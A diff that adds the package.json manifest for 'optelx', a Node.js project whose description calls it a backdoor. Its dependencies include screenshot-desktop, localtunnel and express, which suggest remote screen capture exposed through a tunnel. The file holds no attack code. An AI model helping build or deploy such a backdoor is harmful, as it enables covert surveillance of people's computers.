@@ -1,0 +1,37 @@
+{
+  "name": "optelx",
+  "version": "1.0.0",
+  "description": "OptelX es un Backdoor escrito en Node.js",
+  "main": "dist/index.js",
+  "scripts": {
+    "start": "node dist/index.js",
+    "dev": "nodemon src/index.ts",
+    "build": "npm i --omit=dev",
+    "compile:sass": "sass --watch src/public/scss:src/public/css",
+    "compile": "tsc && cp -r src/public dist && cp -r src/views dist && cp -r src/screenshots dist",
+    "last": "git log -1 --pretty=%B",
+    "update-repo": "ts-node update-repo.ts"
+  },
+  "keywords": [],
+  "author": "AngelRaymondi",
+  "license": "MIT",
+  "devDependencies": {
+    "@types/cli-color": "^2.0.3",
+    "@types/express": "^4.17.17",
+    "@types/node": "^20.6.2"
+  },
+  "dependencies": {
+    "@types/localtunnel": "^2.0.2",
+    "@types/screenshot-desktop": "^1.12.0",
+    "@types/uuid": "^9.0.4",
+    "axios": "^1.5.0",
+    "cli-color": "^2.0.3",
+    "dotenv": "^16.3.1",
+    "express": "^4.18.2",
+    "localtunnel": "^2.0.2",
+    "path": "^0.12.7",
+    "pug": "^3.0.2",
+    "screenshot-desktop": "^1.15.0",
+    "uuid": "^9.0.1"
+  }
+}
